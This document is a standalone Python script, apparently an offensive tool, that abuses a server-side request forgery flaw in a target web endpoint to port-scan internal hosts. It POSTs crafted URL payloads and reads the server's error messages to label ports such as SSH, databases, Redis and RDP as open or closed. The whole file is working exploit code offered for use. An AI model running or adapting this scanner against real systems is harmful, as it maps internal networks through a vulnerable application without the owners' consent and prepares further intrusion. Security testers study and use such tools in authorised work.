#!/usr/bin/env python3
import argparse
import requests
from typing import List, Dict, Any


def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="SSRF port scanner")
    parser.add_argument('-t', '--target', help='Target URL to send requests to', required=True)
    parser.add_argument('--timeout', help='Request timeout in seconds', type=float, default=3.0)
    parser.add_argument('-s', '--ssrf', help='SSRF target host to scan', required=True)
    parser.add_argument('-p', '--ports', help='Comma-separated list of ports to scan', default=None)
    parser.add_argument('-v', '--verbose', help='Enable verbose mode', action="store_true", default=False)
    return parser.parse_args()


def get_ports_to_scan(ports_arg: str = None) -> List[int]:
    """Get the list of ports to scan, either from arguments or default list."""
    default_ports = [22, 80, 443, 1433, 1521, 3306, 3389, 5000, 5432, 5900, 6379, 8000, 8001, 8055, 8080, 8443, 9000]
    
    if ports_arg:
        try:
            return [int(p) for p in ports_arg.split(',')]
        except ValueError:
            print("Warning: Invalid port specification, using default ports")
            return default_ports
    
    return default_ports


def scan_port(target_url: str, ssrf_host: str, port: int, timeout: float) -> Dict[str, Any]:
    """Scan a single port and return the result."""
    result = {
        "port": port,
        "status": "unknown",
        "message": ""
    }
    
    try:
        payload = {"url": f"{ssrf_host}:{port}"}
        response = requests.post(url=target_url, json=payload, timeout=timeout)
        result["message"] = response.text
        
        # Analyze response to determine port status
        if "You don't have permission to access this." in response.text:
            result["status"] = "open"
            result["detail"] = "returned permission error, therefore valid resource"
        elif "ECONNREFUSED" in response.text:
            result["status"] = "closed"
            result["detail"] = ""
        elif "Request failed with status code 404" in response.text:
            result["status"] = "open"
            result["detail"] = "returned 404"
        elif "Parse Error:" in response.text:
            result["status"] = "unknown"
            result["detail"] = "returned parse error, potentially open non-http"
        elif "socket hang up" in response.text:
            result["status"] = "open"
            result["detail"] = "socket hang up, likely non-http"
        else:
            result["status"] = "unknown"
            result["detail"] = "unexpected response"
            
    except requests.exceptions.Timeout:
        result["status"] = "timeout"
        result["detail"] = "request timed out"
    except requests.exceptions.RequestException as e:
        result["status"] = "error"
        result["detail"] = str(e)
    
    return result


def display_result(result: Dict[str, Any], verbose: bool = False) -> None:
    """Display the scan result in a formatted way."""
    port = result["port"]
    status = result["status"]
    detail = result.get("detail", "")
    
    if status == "open":
        print(f"{port:5d} \t OPEN - {detail}")
    elif status == "closed":
        print(f"{port:5d} \t CLOSED")
    elif status == "timeout":
        print(f"{port:5d} \t TIMED OUT")
    elif status == "unknown":
        if verbose or "unexpected response" in detail:
            print(f"{port:5d} \t ???? - {detail}")
            if verbose and result.get("message"):
                print(f"        Response: {result['message'][:100]}...")
        else:
            print(f"{port:5d} \t {detail}")
    else:
        print(f"{port:5d} \t ERROR - {detail}")


def main() -> None:
    """Main function to coordinate the scanning process."""
    args = parse_arguments()
    ports = get_ports_to_scan(args.ports)
    
    print(f"Scanning {args.ssrf} through {args.target}")
    print(f"Ports to scan: {len(ports)}")
    print("Port   \t Status")
    print("-------\t-----------------")
    
    for port in ports:
        result = scan_port(args.target, args.ssrf, port, args.timeout)
        display_result(result, args.verbose)


if __name__ == "__main__":
    main()